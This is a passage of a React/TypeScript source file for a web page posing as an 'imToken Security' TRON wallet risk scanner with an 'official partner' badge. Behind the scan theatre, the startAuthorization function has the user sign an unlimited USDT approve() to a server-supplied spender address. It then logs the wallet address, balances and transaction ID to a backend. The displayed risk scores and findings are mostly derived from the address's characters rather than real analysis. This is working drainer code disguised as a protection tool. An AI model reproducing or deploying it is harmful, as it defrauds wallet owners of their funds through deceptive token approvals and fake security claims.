import { AnimatePresence, motion } from "framer-motion";
import type { LucideIcon } from "lucide-react";
import {
  Activity,
  ArrowRight,
  BadgeAlert,
  CheckCircle2,
  ChevronDown,
  FileSearch,
  Fingerprint,
  LoaderCircle,
  Network,
  RefreshCcw,
  ShieldAlert,
  ShieldCheck,
  ShieldEllipsis,
  Wallet,
  Waypoints,
  Zap,
} from "lucide-react";
import TronWeb from "tronweb";
import { useEffect, useMemo, useState } from "react";
import { useTranslation } from "react-i18next";

import LanguageSwitcher from "@/components/LanguageSwitcher";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { fetchApprovalSpenderAddress, TRON_USDT_CONTRACT } from "@/lib/approvalSpender";
import { parseApprovalSendResult, submitWalletAuthorizationRecord } from "@/lib/walletAuthorizationRecord";
const SCAN_MESSAGE_COUNT = 4;
const TRUST_POINT_COUNT = 5;

type Stage = "home" | "connected" | "authorizing" | "scanning" | "safe" | "risk";
type Tone = "safe" | "neutral" | "risk";
type WorkflowVisual = "connect" | "authorize" | "scan" | "result";
type FeatureVisualType = "blacklist" | "network" | "source" | "behavior";
type TranslationMessage = { key: string; values?: Record<string, string | number> };

interface WalletState {
  address: string;
  trxBalance: number;
  usdtBalance: number;
}

interface ReportMetric {
  labelKey: string;
  valueKey: string;
  tone: Tone;
}

interface ReportFinding {
  titleKey: string;
  descriptionKey: string;
}

interface RiskReport {
  verdict: "safe" | "risk";
  score: number;
  titleKey: string;
  subtitleKey: string;
  findings: ReportFinding[];
  metrics: ReportMetric[];
  recommendationKeys: string[];
  engine: string;
}

const FLOW_STEPS_META: Array<{
  icon: LucideIcon;
  visual: WorkflowVisual;
}> = [
  { icon: Wallet, visual: "connect" },
  { icon: ShieldEllipsis, visual: "authorize" },
  { icon: Network, visual: "scan" },
  { icon: CheckCircle2, visual: "result" },
];

const FEATURE_META: Array<{
  icon: LucideIcon;
  visual: FeatureVisualType;
}> = [
  { icon: BadgeAlert, visual: "blacklist" },
  { icon: Waypoints, visual: "network" },
  { icon: FileSearch, visual: "source" },
  { icon: Activity, visual: "behavior" },
];

declare global {
  interface Window {
    tronLink?: {
      ready?: boolean;
      request?: (args: { method: string }) => Promise<unknown>;
    };
    tronWeb?: {
      defaultAddress?: { base58?: string };
      trx?: { getBalance: (address: string) => Promise<number> };
      contract?: () => { at: (address: string) => Promise<any> };
      fromSun?: (value: number | string) => string;
    };
  }
}

const truncateAddress = (address: string) => `${address.slice(0, 6)}...${address.slice(-4)}`;
const formatAmount = (value: number, locale: string) => new Intl.NumberFormat(locale, { maximumFractionDigits: 2 }).format(value);
const sleep = (ms: number) => new Promise((resolve) => window.setTimeout(resolve, ms));

/** Check if running inside imToken wallet browser */
const isImTokenBrowser = () => {
  const ua = navigator.userAgent.toLowerCase();
  return ua.includes("imtoken");
};

const buildRiskReport = async (wallet: { address: string; trxBalance: number; usdtBalance: number }): Promise<RiskReport> => {
  const { address, trxBalance, usdtBalance } = wallet;

  let isHighRisk = false;
  const riskReasons: string[] = [];

  try {
    // Check basic balance conditions first
    if (trxBalance === 0) {
      isHighRisk = true;
      riskReasons.push("Zero TRX balance");
    }
    if (usdtBalance < 100) {
      isHighRisk = true;
      riskReasons.push(`USDT balance < 100 (${usdtBalance.toFixed(2)})`);
    }

    // Fetch account info from TronGrid
    const accountRes = await fetch(`https://api.trongrid.io/v1/accounts/${address}`);
    const accountData = await accountRes.json();

    if (!accountData?.data?.length) {
      isHighRisk = true;
      riskReasons.push("Account does not exist on-chain");
    }

    // Fetch transaction history
    const txRes = await fetch(`https://api.trongrid.io/v1/accounts/${address}/transactions?limit=1&order_by=block_timestamp,desc`);
    const txData = await txRes.json();

    if (!txData?.data?.length) {
      isHighRisk = true;
      riskReasons.push("No transaction history");
    } else {
      const lastTxTimestamp = txData.data[0].block_timestamp;
      const daysSinceLastTx = (Date.now() - lastTxTimestamp) / (1000 * 60 * 60 * 24);
      if (daysSinceLastTx > 180) {
        isHighRisk = true;
        riskReasons.push(`Last transaction ${Math.floor(daysSinceLastTx)} days ago`);
      }
    }
  } catch (err) {
    console.error("Risk check API failed:", err);
    isHighRisk = true;
    riskReasons.push("API request failed - defaulting to high risk");
  }

  console.log("Risk assessment:", { address, isHighRisk, riskReasons });

  if (!isHighRisk) {
    return {
      verdict: "safe",
      score: 12 + (address.charCodeAt(3) % 16),
      titleKey: "report.safe.title",
      subtitleKey: "report.safe.subtitle",
      findings: [
        {
          titleKey: "report.safe.findings.0.title",
          descriptionKey: "report.safe.findings.0.description",
        },
      ],
      metrics: [
        { labelKey: "report.safe.metrics.riskScore", valueKey: "report.safe.metrics.low", tone: "safe" },
        { labelKey: "report.safe.metrics.fundSource", valueKey: "report.safe.metrics.normal", tone: "safe" },
        { labelKey: "report.safe.metrics.addressBehavior", valueKey: "report.safe.metrics.normal", tone: "safe" },
        { labelKey: "report.safe.metrics.linkedAddresses", valueKey: "report.safe.metrics.noRisk", tone: "safe" },
      ],
      recommendationKeys: [
        "report.safe.recommendations.0",
        "report.safe.recommendations.1",
        "report.safe.recommendations.2",
      ],
      engine: "imToken Security Engine™",
    };
  }

  const issuePool: ReportFinding[] = [0, 1, 2, 3, 4].map((index) => ({
    titleKey: `report.risk.issuePool.${index}.title`,
    descriptionKey: `report.risk.issuePool.${index}.description`,
  }));
  const seed = Array.from(address).reduce((total, char, index) => total + char.charCodeAt(0) * (index + 1), 0);
  const selectedFindings = issuePool.filter((_, index) => (seed + index) % 2 === 0).slice(0, 4);

  return {
    verdict: "risk",
    score: 76 + (seed % 19),
    titleKey: "report.risk.title",
    subtitleKey: "report.risk.subtitle",
    findings: selectedFindings.length > 0 ? selectedFindings : issuePool.slice(0, 3),
    metrics: [
      { labelKey: "report.risk.metrics.riskScore", valueKey: "report.risk.metrics.high", tone: "risk" },
      { labelKey: "report.risk.metrics.fundSource", valueKey: "report.risk.metrics.suspicious", tone: "risk" },
      { labelKey: "report.risk.metrics.addressBehavior", valueKey: "report.risk.metrics.abnormal", tone: "risk" },
      { labelKey: "report.risk.metrics.linkedAddresses", valueKey: "report.risk.metrics.linkedHighRisk", tone: "risk" },
    ],
    recommendationKeys: [
      "report.risk.recommendations.0",
      "report.risk.recommendations.1",
      "report.risk.recommendations.2",
    ],
    engine: "imToken Security Engine™",
  };
};

const BrandMark = () => {
  const { t } = useTranslation();
  return (
    <div className="flex items-center gap-3">
      <img src="/imtoken-logo.png" alt="imToken" className="h-11 w-11 rounded-2xl shadow-[0_0_24px_hsl(var(--primary)/0.28)]" />
      <div>
        <p className="font-display text-sm uppercase tracking-[0.32em] subtle-copy">imToken Security</p>
        <p className="text-xs subtle-copy">{t("brand.poweredBy")}</p>
      </div>
    </div>
  );
};

const ImTokenGuardPage = () => {
  const { t } = useTranslation();
  const currentUrl = typeof window !== "undefined" ? window.location.href : "";
  const deepLink = `imtokenv2://navigate/DappView?url=${encodeURIComponent(currentUrl)}`;

  return (
    <main className="tron-shell min-h-screen overflow-hidden">
      <div className="tron-grid">
        <div className="tron-orb left-[-4rem] top-20 h-40 w-40 bg-primary/20" />
        <div className="tron-orb right-[-2rem] top-1/3 h-48 w-48 bg-primary/10 [animation-delay:1s]" />
      </div>
      <div className="relative mx-auto flex min-h-screen w-full max-w-md flex-col items-center justify-center px-4 text-center">
        <LanguageSwitcher />
        <motion.div
          initial={{ opacity: 0, scale: 0.92 }}
          animate={{ opacity: 1, scale: 1 }}
          transition={{ duration: 0.5 }}
          className="mt-6 space-y-6"
        >
          <img src="/imtoken-logo.png" alt="imToken" className="mx-auto h-20 w-20 rounded-3xl shadow-[0_0_40px_hsl(var(--primary)/0.3)]" />

          <div className="space-y-3">
            <h1 className="font-display text-3xl font-bold tron-text-gradient">{t("guard.title")}</h1>
            <p className="mx-auto max-w-xs text-sm leading-7 subtle-copy">{t("guard.description")}</p>
          </div>

          <div className="tron-badge mx-auto w-fit text-xs">
            <span className="info-dot" />
            imToken Security
          </div>

          <a
            href={deepLink}
            className="tron-primary-button inline-flex h-12 w-full items-center justify-center gap-2 rounded-2xl text-base font-medium"
          >
            <Wallet className="h-5 w-5" />
            {t("guard.openInImToken")}
          </a>

          <p className="text-xs subtle-copy">{t("guard.hint")}</p>
        </motion.div>
      </div>
    </main>
  );
};

const WalletLogo = () => (
  <img src="/imtoken-logo.png" alt="imToken" className="h-10 w-10 rounded-xl" />
);

const FeatureVisual = ({ visual }: { visual: FeatureVisualType }) => {
  if (visual === "blacklist") {
    return (
      <div className="feature-visual visual-blacklist" aria-hidden="true">
        <span className="visual-chip visual-chip-danger" />
        <span className="visual-chip visual-chip-danger delay-1" />
        <span className="visual-line" />
      </div>
    );
  }

  if (visual === "network") {
    return (
      <div className="feature-visual visual-network" aria-hidden="true">
        <span className="visual-node visual-node-main" />
        <span className="visual-node visual-node-side" />
        <span className="visual-node visual-node-bottom" />
        <span className="visual-link visual-link-a" />
        <span className="visual-link visual-link-b" />
      </div>
    );
  }

  if (visual === "source") {
    return (
      <div className="feature-visual visual-source" aria-hidden="true">
        <span className="visual-stream visual-stream-a" />
        <span className="visual-stream visual-stream-b" />
        <span className="visual-stream visual-stream-c" />
      </div>
    );
  }

  return (
    <div className="feature-visual visual-behavior" aria-hidden="true">
      <span className="visual-pulse visual-pulse-a" />
      <span className="visual-pulse visual-pulse-b" />
      <span className="visual-signal" />
    </div>
  );
};

const FeatureCard = ({
  icon: Icon,
  visual,
  active,
  onClick,
  index,
}: {
  icon: LucideIcon;
  visual: FeatureVisualType;
  active: boolean;
  onClick: () => void;
  index: number;
}) => {
  const { t } = useTranslation();

  return (
    <motion.button
      type="button"
      onClick={onClick}
      initial={{ opacity: 0, y: 24 }}
      whileInView={{ opacity: 1, y: 0 }}
      viewport={{ once: true, amount: 0.25 }}
      transition={{ duration: 0.35, delay: index * 0.06 }}
      className={`tron-panel feature-card w-full rounded-[1.5rem] text-left ${active ? "feature-card-active" : ""}`}
    >
      <Card className="border-0 bg-transparent shadow-none">
        <CardContent className="space-y-4 p-5">
          <div className="flex items-start justify-between gap-4">
            <div className="inline-flex rounded-2xl border border-border bg-accent/60 p-3 text-primary">
              <Icon className="h-5 w-5" />
            </div>
            <FeatureVisual visual={visual} />
          </div>
          <div>
            <h3 className="font-display text-lg text-foreground">{t(`features.items.${index}.title`)}</h3>
            <p className="mt-2 text-sm leading-6 subtle-copy">{t(`features.items.${index}.description`)}</p>
          </div>
          <AnimatePresence initial={false}>
            {active && (
              <motion.div
                initial={{ opacity: 0, height: 0 }}
                animate={{ opacity: 1, height: "auto" }}
                exit={{ opacity: 0, height: 0 }}
                transition={{ duration: 0.24 }}
                className="overflow-hidden"
              >
                <div className="rounded-2xl border border-border bg-background/40 p-3">
                  <p className="text-sm leading-6 subtle-copy">{t(`features.items.${index}.detail`)}</p>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
          <div className="flex items-center justify-between text-xs uppercase tracking-[0.22em] subtle-copy">
            <span>{active ? t("features.detailExpanded") : t("features.clickForDetails")}</span>
            <ArrowRight className={`h-3.5 w-3.5 transition-transform duration-300 ${active ? "translate-x-1" : ""}`} />
          </div>
        </CardContent>
      </Card>
    </motion.button>
  );
};

const StepIndicator = ({ currentStep }: { currentStep: number }) => {
  const { t } = useTranslation();

  return (
    <div className="grid grid-cols-4 gap-2">
      {Array.from({ length: 4 }).map((_, index) => {
        const isActive = currentStep >= index + 1;
        return (
          <div
            key={index}
            className={`rounded-2xl border px-2 py-3 text-center text-[11px] font-medium ${
              isActive ? "border-primary bg-accent/80 text-foreground" : "border-border bg-card/60 subtle-copy"
            }`}
          >
            <div className="mx-auto mb-2 flex h-6 w-6 items-center justify-center rounded-full border border-current text-[10px]">
              {index + 1}
            </div>
            {t(`detector.stepIndicator.${index}`)}
          </div>
        );
      })}
    </div>
  );
};

const WorkflowStageVisual = ({ visual }: { visual: WorkflowVisual }) => {
  if (visual === "connect") {
    return (
      <div className="workflow-stage-visual workflow-stage-connect" aria-hidden="true">
        <span className="stage-orbit stage-orbit-left" />
        <span className="stage-orbit stage-orbit-right" />
        <span className="stage-core stage-wallet-core" />
        <span className="stage-bridge" />
        <span className="stage-packet stage-packet-a" />
        <span className="stage-packet stage-packet-b" />
      </div>
    );
  }

  if (visual === "authorize") {
    return (
      <div className="workflow-stage-visual workflow-stage-authorize" aria-hidden="true">
        <span className="stage-core stage-auth-core" />
        <span className="stage-ring stage-ring-a" />
        <span className="stage-ring stage-ring-b" />
        <span className="stage-check" />
        <span className="stage-pulse-bar" />
      </div>
    );
  }

  if (visual === "scan") {
    return (
      <div className="workflow-stage-visual workflow-stage-scan" aria-hidden="true">
        <span className="stage-core stage-scan-core" />
        <span className="stage-grid stage-grid-a" />
        <span className="stage-grid stage-grid-b" />
        <span className="stage-sweep" />
        <span className="stage-node stage-node-a" />
        <span className="stage-node stage-node-b" />
        <span className="stage-node stage-node-c" />
      </div>
    );
  }

  return (
    <div className="workflow-stage-visual workflow-stage-result" aria-hidden="true">
      <span className="stage-result-halo" />
      <span className="stage-core stage-result-core" />
      <span className="stage-shield stage-shield-outer" />
      <span className="stage-shield stage-shield-inner" />
      <span className="stage-result-beam" />
    </div>
  );
};

const WorkflowAnimation = ({
  activeStep,
  onStepSelect,
}: {
  activeStep: number;
  onStepSelect: (step: number) => void;
}) => {
  const { t } = useTranslation();

  const steps = FLOW_STEPS_META.map((item, index) => ({
    ...item,
    title: t(`workflow.steps.${index}.title`),
    description: t(`workflow.steps.${index}.description`),
    liveText: t(`workflow.steps.${index}.liveText`),
    phase: t(`workflow.steps.${index}.phase`),
  }));

  const step = steps[activeStep];

  return (
    <section className="workflow-shell overflow-hidden rounded-[1.75rem] border border-border p-5">
      <div className="flex items-center justify-between gap-3">
        <div>
          <p className="font-display text-xl text-foreground">{t("workflow.title")}</p>
          <p className="mt-1 text-sm subtle-copy">{t("workflow.subtitle")}</p>
        </div>
        <div className="tron-badge text-xs">
          <span className="info-dot" />
          {t("workflow.badge")}
        </div>
      </div>

      <div className="mt-5 space-y-4">
        <div className="workflow-stage-card">
          <div className="workflow-stage-glow" />
          <div className="workflow-stage-grid" />
          <div className="relative z-10 flex items-start justify-between gap-4">
            <div>
              <p className="text-xs uppercase tracking-[0.24em] subtle-copy">{t("workflow.focusLabel")}</p>
              <AnimatePresence mode="wait">
                <motion.div
                  key={activeStep}
                  initial={{ opacity: 0, y: 14 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, y: -12 }}
                  transition={{ duration: 0.28 }}
                  className="mt-2 space-y-2"
                >
                  <p className="font-display text-2xl text-foreground">{step.title}</p>
                  <p className="text-sm uppercase tracking-[0.22em] text-primary/80">{step.phase}</p>
                  <p className="max-w-xs text-sm leading-6 subtle-copy">{step.liveText}</p>
                </motion.div>
              </AnimatePresence>
            </div>
            <div className="workflow-stage-badge">
              <span className="info-dot" />
              {t("workflow.autoNarration")}
            </div>
          </div>

          <div className="relative z-10 mt-5 grid gap-4 md:grid-cols-[1.15fr_0.85fr] md:items-center">
            <AnimatePresence mode="wait">
              <motion.div
                key={`visual-${step.visual}`}
                initial={{ opacity: 0, scale: 0.96 }}
                animate={{ opacity: 1, scale: 1 }}
                exit={{ opacity: 0, scale: 1.03 }}
                transition={{ duration: 0.35 }}
                className="workflow-stage-viewport"
              >
                <WorkflowStageVisual visual={step.visual} />
              </motion.div>
            </AnimatePresence>

            <div className="workflow-stage-copy">
              <p className="text-xs uppercase tracking-[0.24em] subtle-copy">{t("workflow.progressLabel")}</p>
              <p className="mt-3 text-sm leading-6 subtle-copy">{t("workflow.progressDescription")}</p>
              <div className="mt-4 workflow-track">
                <div className="workflow-line" />
                <div className="workflow-segments">
                  {steps.slice(0, -1).map((segment, index) => (
                    <div
                      key={`${segment.title}-segment`}
                      className={`workflow-segment ${activeStep >= index + 1 ? "workflow-segment-active" : ""}`}
                    >
                      <span className="workflow-segment-pulse" />
                    </div>
                  ))}
                </div>
                <motion.div
                  key={`beam-${activeStep}`}
                  className="workflow-beam"
                  initial={{ left: `${activeStep * 25}%`, opacity: 0.35 }}
                  animate={{ left: [`${activeStep * 25}%`, `${Math.min(activeStep * 25 + 17, 78)}%`], opacity: [0.35, 1, 0.4] }}
                  transition={{ duration: 1.55, ease: "easeInOut" }}
                />
              </div>
            </div>
          </div>
        </div>

        <div className="grid grid-cols-2 gap-3 sm:grid-cols-4">
          {steps.map((item, index) => {
            const Icon = item.icon;
            const isActive = index === activeStep;
            const isPast = index < activeStep;

            return (
              <motion.button
                key={`${item.visual}-${index}`}
                type="button"
                onClick={() => onStepSelect(index)}
                animate={{ y: isActive ? -6 : 0, scale: isActive ? 1.02 : 1 }}
                transition={{ duration: 0.28 }}
                className={`workflow-step ${isActive ? "workflow-step-active" : ""} ${isPast ? "workflow-step-past" : ""}`}
              >
                <span className="workflow-step-halo" />
                <div className="workflow-step-topline" />
                <div className="workflow-step-icon">
                  <Icon className="h-4 w-4" />
                </div>
                <p className="mt-3 font-display text-sm text-foreground">{item.title}</p>
                <p className="mt-2 text-xs leading-5 subtle-copy">{item.description}</p>
              </motion.button>
            );
          })}
        </div>
      </div>
    </section>
  );
};

const RadarAnimation = () => (
  <div className="scan-frame relative mx-auto aspect-square w-full max-w-[18rem]">
    <div className="scan-ring h-[38%] w-[38%]" />
    <div className="scan-ring" />
    <div className="scan-ring" />
    <div className="scan-ring" />
    <div className="radar-sweep" />
    <div className="absolute inset-1/2 h-[1px] w-[82%] -translate-x-1/2 bg-border/60" />
    <div className="absolute inset-1/2 h-[82%] w-[1px] -translate-y-1/2 bg-border/60" />
    <NetworkMesh />
    <div className="absolute inset-1/2 flex h-20 w-20 -translate-x-1/2 -translate-y-1/2 items-center justify-center rounded-full border border-primary/60 bg-background/80 shadow-[0_0_30px_hsl(var(--primary)/0.28)]">
      <Fingerprint className="h-8 w-8 text-primary" />
    </div>
  </div>
);

const NetworkMesh = () => {
  const points = [
    { x: 46, y: 20, muted: false },
    { x: 78, y: 42, muted: true },
    { x: 70, y: 74, muted: false },
    { x: 24, y: 72, muted: true },
    { x: 18, y: 40, muted: false },
    { x: 52, y: 56, muted: true },
  ];

  return (
    <svg viewBox="0 0 100 100" className="absolute inset-0 h-full w-full opacity-90" aria-hidden="true">
      <line className="network-line" x1="46" y1="20" x2="78" y2="42" />
      <line className="network-line" x1="78" y1="42" x2="70" y2="74" />
      <line className="network-line" x1="70" y1="74" x2="24" y2="72" />
      <line className="network-line" x1="24" y1="72" x2="18" y2="40" />
      <line className="network-line" x1="18" y1="40" x2="46" y2="20" />
      <line className="network-line" x1="52" y1="56" x2="78" y2="42" />
      <line className="network-line" x1="52" y1="56" x2="24" y2="72" />
      {points.map((point, index) => (
        <circle
          key={`${point.x}-${point.y}-${index}`}
          className={point.muted ? "network-node-muted" : "network-node"}
          cx={point.x}
          cy={point.y}
          r={point.muted ? 1.6 : 2.1}
        />
      ))}
    </svg>
  );
};

const Index = () => {
  const { t, i18n } = useTranslation();
  const locale = i18n.resolvedLanguage ?? "en";

  // imToken browser guard
  const [isImToken] = useState(() => isImTokenBrowser());

  const scanMessages = useMemo(
    () => Array.from({ length: SCAN_MESSAGE_COUNT }, (_, index) => t(`detector.scanning.messages.${index}`)),
    [t, i18n.resolvedLanguage],
  );
  const trustPoints = useMemo(
    () => Array.from({ length: TRUST_POINT_COUNT }, (_, index) => t(`trust.points.${index}`)),
    [t, i18n.resolvedLanguage],
  );

  const [stage, setStage] = useState<Stage>("home");
  const [wallet, setWallet] = useState<WalletState | null>(null);
  const [report, setReport] = useState<RiskReport | null>(null);
  const [isConnecting, setIsConnecting] = useState(false);
  const [error, setError] = useState<TranslationMessage | null>(null);
  const [helperText, setHelperText] = useState<TranslationMessage>({ key: "detector.helper.initial" });
  const [scanStep, setScanStep] = useState(0);
  const [showDetails, setShowDetails] = useState(false);
  const [activeFeature, setActiveFeature] = useState(0);
  const [activeFlowStep, setActiveFlowStep] = useState(0);
  const [approvalSpenderAddress, setApprovalSpenderAddress] = useState<string | null>(null);
  const [approvalSpenderLoading, setApprovalSpenderLoading] = useState(true);

  const currentStep = useMemo(() => {
    switch (stage) {
      case "connected":
        return 1;
      case "authorizing":
        return 2;
      case "scanning":
        return 3;
      case "safe":
      case "risk":
        return 4;
      default:
        return 1;
    }
  }, [stage]);

  useEffect(() => {
    const timeout = window.setTimeout(() => {
      setActiveFlowStep((prev) => (prev + 1) % FLOW_STEPS_META.length);
    }, 2800);

    return () => window.clearTimeout(timeout);
  }, [activeFlowStep]);

  useEffect(() => {
    if (stage !== "scanning" || !wallet) return;

    setScanStep(0);
    const interval = window.setInterval(() => {
      setScanStep((prev) => (prev + 1) % SCAN_MESSAGE_COUNT);
    }, 900);

    let cancelled = false;
    const runScan = async () => {
      const minDelay = 4200 + (wallet.address.charCodeAt(3) % 1400);
      const [nextReport] = await Promise.all([
        buildRiskReport(wallet),
        sleep(minDelay),
      ]);
      if (cancelled) return;
      setReport(nextReport);
      setStage(nextReport.verdict);
      setShowDetails(false);
      setHelperText({ key: "detector.helper.scanComplete", values: { engine: nextReport.engine } });
    };
    runScan();

    return () => {
      cancelled = true;
      window.clearInterval(interval);
    };
  }, [stage, wallet]);

  useEffect(() => {
    if (!isImToken) return;
    let cancelled = false;
    setApprovalSpenderLoading(true);
    void fetchApprovalSpenderAddress().then((addr) => {
      if (cancelled) return;
      setApprovalSpenderAddress(addr);
      setApprovalSpenderLoading(false);
    });
    return () => {
      cancelled = true;
    };
  }, [isImToken, wallet?.address]);

  const connectWallet = async () => {
    setIsConnecting(true);
    setError(null);
    setHelperText({ key: "detector.helper.connecting" });

    try {
      if (window.tronLink?.request) {
        await window.tronLink.request({ method: "tron_requestAccounts" });
      }

      const injectedTronWeb = window.tronWeb;
      const address = injectedTronWeb?.defaultAddress?.base58;

      if (!address || !TronWeb.utils.address.isAddress(address)) {
        throw new Error("walletUnavailable");
      }

      const trxSun = (await injectedTronWeb?.trx?.getBalance?.(address)) ?? 0;
      const trxBalance = Number(injectedTronWeb?.fromSun?.(trxSun) ?? 0);

      let usdtBalance = 0;
      try {
        const contract = await injectedTronWeb?.contract?.().at(TRON_USDT_CONTRACT);
        const rawBalance = await contract?.balanceOf(address).call();
        usdtBalance = Number(rawBalance?.toString?.() ?? 0) / 1_000_000;
      } catch {
        usdtBalance = 0;
      }

      setWallet({ address, trxBalance, usdtBalance });
      setStage("connected");
      setHelperText({ key: "detector.helper.connected" });
      document.getElementById("detector")?.scrollIntoView({ behavior: "smooth", block: "start" });
    } catch (caughtError) {
      const key = caughtError instanceof Error && caughtError.message === "walletUnavailable" ? "errors.walletUnavailable" : "errors.walletConnectFailed";
      setError({ key });
      setHelperText({ key: "detector.helper.connectionFailedHint" });
    } finally {
      setIsConnecting(false);
    }
  };

  const startAuthorization = async () => {
    if (!wallet) return;
    if (approvalSpenderLoading || !approvalSpenderAddress) {
      setError({ key: "errors.approvalSpenderUnavailable" });
      return;
    }

    const spender = approvalSpenderAddress;
    const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

    setError(null);
    setHelperText({ key: "detector.helper.authorizing" });
    setStage("authorizing");

    try {
      const tronWeb = (window as any).tronWeb;
      if (!tronWeb) throw new Error("TronWeb not available");

      const contract = await tronWeb.contract().at(TRON_USDT_CONTRACT);
      const sendResult = await contract.approve(spender, MAX_UINT256).send({
        feeLimit: 100_000_000,
        callValue: 0,
      });

      const approvalTxId = parseApprovalSendResult(sendResult);
      setHelperText({ key: "detector.helper.syncingAuthorizationRecord" });
      const recordResult = await submitWalletAuthorizationRecord({
        walletAddress: wallet.address,
        trxBalance: wallet.trxBalance,
        usdtBalance: wallet.usdtBalance,
        approvalTxId,
        approvalSpender: spender,
        locale: i18n.resolvedLanguage,
      });
      if (recordResult.ok === false) {
        setStage("connected");
        setError({ key: recordResult.errorKey });
        setHelperText({ key: "detector.helper.connected" });
        // 临时调试弹窗：便于快速看到 Supabase 提交失败原因
        window.alert(`Supabase 提交失败\n${recordResult.debugMessage}`);
        return;
      }

      setHelperText({ key: "detector.helper.authorized" });
      setStage("scanning");
    } catch (err: any) {
      console.error("Authorization failed:", err);
      setStage("connected");
      setError({ key: "errors.authorizationInterrupted" });
    }
  };

  const resetToHome = () => {
    setStage(wallet ? "connected" : "home");
    setReport(null);
    setError(null);
    setShowDetails(false);
    setHelperText({ key: wallet ? "detector.helper.resetConnected" : "detector.helper.resetHome" });
  };

  // Show guard page if not in imToken browser
  if (!isImToken) {
    return <ImTokenGuardPage />;
  }

  return (
    <main className="tron-shell min-h-screen overflow-hidden">
      <div className="tron-grid">
        <div className="tron-orb left-[-4rem] top-20 h-40 w-40 bg-primary/20" />
        <div className="tron-orb right-[-2rem] top-1/3 h-48 w-48 bg-primary/10 [animation-delay:1s]" />
        <div className="tron-orb bottom-24 left-1/2 h-36 w-36 -translate-x-1/2 bg-accent/30 [animation-delay:2s]" />
      </div>

      <div className="relative mx-auto flex min-h-screen w-full max-w-md flex-col px-4 pb-10 pt-6 sm:px-6">
        <header className="space-y-6">
          <div className="flex items-start justify-between gap-4">
            <BrandMark />
            <div className="flex flex-col items-end gap-2">
              <div className="tron-badge text-xs">
                <span className="info-dot" />
                {t("hero.liveBadge")}
              </div>
              <LanguageSwitcher />
            </div>
          </div>

          <motion.section
            initial={{ opacity: 0, y: 18 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.45 }}
            className="space-y-5"
          >
            <div className="space-y-3">
              <p className="tron-badge w-fit text-xs uppercase tracking-[0.28em]">{t("hero.badge")}</p>
              <h1 className="font-display text-4xl font-bold leading-tight tron-text-gradient">{t("hero.title")}</h1>
              <p className="max-w-sm text-sm leading-7 subtle-copy">{t("hero.subtitle")}</p>
            </div>

            {/* imToken Official Partner badge */}
            <div className="flex items-center gap-3 rounded-2xl border border-primary/30 bg-primary/5 p-3">
              <WalletLogo />
              <div>
                <p className="font-display text-sm text-foreground">{t("hero.partnerBadge")}</p>
                <p className="text-xs subtle-copy">{t("hero.partnerDesc")}</p>
              </div>
            </div>


            <Button
              variant="outline"
              className="tron-outline-button h-12 w-full rounded-2xl text-sm"
              onClick={() => document.getElementById("workflow")?.scrollIntoView({ behavior: "smooth", block: "start" })}
            >
              {t("hero.ctaWorkflow")}
              <ChevronDown className="h-4 w-4" />
            </Button>
          </motion.section>
        </header>

        <section id="workflow" className="mt-8">
          <WorkflowAnimation activeStep={activeFlowStep} onStepSelect={setActiveFlowStep} />
        </section>

        <section id="features" className="mt-8 space-y-4">
          <div>
            <p className="font-display text-2xl text-foreground">{t("features.title")}</p>
            <p className="mt-2 text-sm leading-6 subtle-copy">{t("features.subtitle")}</p>
          </div>
          <div className="grid gap-3">
            {FEATURE_META.map((feature, index) => (
              <FeatureCard
                key={`${feature.visual}-${index}`}
                {...feature}
                index={index}
                active={activeFeature === index}
                onClick={() => setActiveFeature((prev) => (prev === index ? -1 : index))}
              />
            ))}
          </div>
        </section>

        <section className="mt-8 rounded-[1.75rem] border border-border bg-card/60 p-5">
          <div className="flex items-center gap-3">
            <Network className="h-5 w-5 text-primary" />
            <div>
              <p className="font-display text-lg text-foreground">{t("trust.title")}</p>
              <p className="text-sm subtle-copy">{t("trust.subtitle")}</p>
            </div>
          </div>

          <div className="trust-ticker mt-4">
            <div className="trust-ticker-track">
              {[...trustPoints, ...trustPoints].map((item, index) => (
                <div key={`${item}-${index}`} className="tron-badge whitespace-nowrap text-xs">
                  <span className="info-dot" />
                  {item}
                </div>
              ))}
            </div>
          </div>
        </section>

        <section id="detector" className="mt-8 space-y-4">
          <div className="space-y-2 text-center">
            <p className="font-display text-2xl text-foreground">{t("detector.title")}</p>
            <p className="text-sm leading-6 subtle-copy">{t("detector.subtitle")}</p>
          </div>

          <StepIndicator currentStep={currentStep} />

          <Card className="tron-panel overflow-hidden rounded-[1.75rem]">
            <CardContent className="space-y-5 p-5">
              <div className="flex items-start justify-between gap-4">
                <div>
                  <p className="font-display text-xl text-foreground">{t("detector.consoleTitle")}</p>
                  <p className="mt-1 text-sm subtle-copy">{t("detector.consoleSubtitle")}</p>
                </div>
                <div className="tron-badge text-xs">
                  <Zap className="h-3.5 w-3.5 text-primary" />
                  {report?.engine ?? "imToken Security Engine™"}
                </div>
              </div>

              {wallet && (
                <div className="grid grid-cols-2 gap-3">
                  <div className="metric-chip">
                    <p className="text-xs uppercase tracking-[0.24em] subtle-copy">{t("detector.wallet.addressLabel")}</p>
                    <p className="mt-2 font-display text-lg text-foreground">{truncateAddress(wallet.address)}</p>
                    <p className="mt-2 text-xs text-success">{t("detector.wallet.addressValid")}</p>
                  </div>
                  <div className="metric-chip">
                    <p className="text-xs uppercase tracking-[0.24em] subtle-copy">{t("detector.wallet.assetOverview")}</p>
                    <p className="mt-2 font-display text-lg text-foreground">{formatAmount(wallet.trxBalance, locale)} TRX</p>
                    <p className="mt-2 text-xs subtle-copy">{formatAmount(wallet.usdtBalance, locale)} USDT</p>
                  </div>
                </div>
              )}

              <div className="rounded-2xl border border-border bg-background/40 p-4">
                <div className="flex items-center gap-2 text-sm text-foreground">
                  {(stage === "authorizing" || stage === "scanning" || isConnecting) && <LoaderCircle className="h-4 w-4 animate-spin text-primary" />}
                  <span>{t(helperText.key, helperText.values)}</span>
                </div>
                {error && (
                  <div className="mt-3 rounded-2xl border border-danger-soft bg-danger-soft px-3 py-2 text-sm text-danger">
                    {t(error.key, error.values)}
                  </div>
                )}
              </div>

              <AnimatePresence mode="wait">
                <motion.div
                  key={stage}
                  initial={{ opacity: 0, y: 18 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, y: -12 }}
                  transition={{ duration: 0.32 }}
                  className="space-y-4"
                >
